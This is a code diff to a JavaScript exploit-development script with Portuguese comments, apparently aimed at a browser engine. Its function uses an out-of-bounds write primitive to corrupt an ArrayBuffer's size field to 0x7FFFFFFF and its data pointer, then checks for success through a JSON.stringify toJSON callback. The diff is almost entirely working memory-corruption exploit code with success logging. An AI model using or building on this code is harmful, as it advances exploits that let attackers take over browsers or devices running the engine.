@@ -19,31 +19,17 @@ async function runTargetedOOBABMetadataExploitation() {
     }
 
     // Cenário A: Tentar Corromper o TAMANHO do oob_array_buffer_real e sondá-lo
-    // A variável global oob_array_buffer_real é criada por triggerOOB_primitive()
-    // dentro de executeFocusedTestForTypeError
     logS3(`\n--- Cenário A: Corromper Tamanho de oob_array_buffer_real @${toHex(size_offset)} para 0x7FFFFFFF ---`, 'subtest', FNAME_RUNNER);
     let resultA = await executeFocusedTestForTypeError(
         "Exploit_CorruptOOBABSize",
         toJSON_AttemptWriteToThis,      // A função toJSON que tentará operar em 'this'
         0x7FFFFFFF,                     // Valor para corromper o tamanho
         size_offset,                    // Offset do campo de tamanho no oob_array_buffer_real
-        4,                              // Bytes para escrever (tamanho é geralmente 4 bytes)
-        oob_array_buffer_real           // O buffer a ser stringificado (e, portanto, 'this' na toJSON)
-                                        // Nota: oob_array_buffer_real será definido DENTRO de executeFocusedTestForTypeError
-                                        // Isso significa que oob_array_buffer_real que é passado aqui é uma referência
-                                        // que será redefinida. Para passar o buffer correto, precisamos garantir
-                                        // que ele é o que foi criado pela triggerOOB_primitive DENTRO do teste.
-                                        // A solução mais simples é passar um placeholder e deixar que o executeFocusedTestForTypeError use o seu próprio.
-                                        // NO ENTANTO, para JSON.stringify(oob_array_buffer_real), ele PRECISA ser o oob_array_buffer_real INTERNO.
-                                        // Uma forma é modificar executeFocusedTestForTypeError para aceitar um callback
-                                        // que lhe diga qual buffer stringificar, ou passar um identificador.
-                                        // Por simplicidade agora, vamos assumir que a referência é passada corretamente
-                                        // ou que o `executeFocusedTestForTypeError` usa o `oob_array_buffer_real` globalmente acessível
-                                        // após sua criação, se o parâmetro bufferToActuallyStringify for ele mesmo.
-                                        // A última alteração em executeFocusedTestForTypeError já faz isso.
+        4                               // Bytes para escrever (tamanho é geralmente 4 bytes)
+        // O buffer a ser stringificado será o oob_array_buffer_real interno da função chamada
     );
 
-    logS3(`   Resultado Cenário A (Tamanho): ${JSON.stringify(resultA.stringifyResult)}`, "info", FNAME_RUNNER);
+    logS3(`   Resultado Cenário A (Tamanho): ${resultA.stringifyResult ? JSON.stringify(resultA.stringifyResult) : "N/A"}`, "info", FNAME_RUNNER);
     if (resultA.stringifyResult?.this_byteLength_prop === 0x7FFFFFFF) {
         logS3(`   !!!! SUCESSO POTENCIAL CENÁRIO A !!!! oob_array_buffer_real.byteLength parece ter sido inflado para 0x7FFFFFFF!`, "critical", FNAME_RUNNER);
         if (resultA.stringifyResult?.oob_read_attempt_val && !String(resultA.stringifyResult.oob_read_attempt_val).startsWith("Error") && !String(resultA.stringifyResult.oob_read_attempt_val).startsWith("Too small")) {
@@ -61,16 +47,15 @@ async function runTargetedOOBABMetadataExploitation() {
         toJSON_AttemptWriteToThis,
         dummy_ptr_val,                  // Valor para corromper o ponteiro (AdvancedInt64)
         contents_ptr_offset,            // Offset do campo de ponteiro
-        8,                              // Bytes para escrever (ponteiro é 8 bytes)
-        oob_array_buffer_real           // Alvo do stringify
+        8                               // Bytes para escrever (ponteiro é 8 bytes)
+        // O buffer a ser stringificado será o oob_array_buffer_real interno da função chamada
     );
-    logS3(`   Resultado Cenário B (Ponteiro): ${JSON.stringify(resultB.stringifyResult)}`, "info", FNAME_RUNNER);
+    logS3(`   Resultado Cenário B (Ponteiro): ${resultB.stringifyResult ? JSON.stringify(resultB.stringifyResult) : "N/A"}`, "info", FNAME_RUNNER);
     if (resultB.stringifyResult?.error_in_toJSON && resultB.stringifyResult.error_in_toJSON.includes("DataView Error")) {
          logS3(`   !!!! SUCESSO POTENCIAL CENÁRIO B !!!! Erro de DataView DENTRO da toJSON após corrupção do ponteiro, como esperado!`, "critical", FNAME_RUNNER);
     } else if (resultB.errorOccurred && resultB.errorOccurred.message.includes("DataView")) {
         logS3(`   !!!! SUCESSO POTENCIAL CENÁRIO B !!!! Erro de DataView FORA da toJSON (no stringify) após corrupção do ponteiro!`, "critical", FNAME_RUNNER);
     }
-
 
     logS3(`==== Testes de Exploração de Metadados de oob_array_buffer_real CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
 }
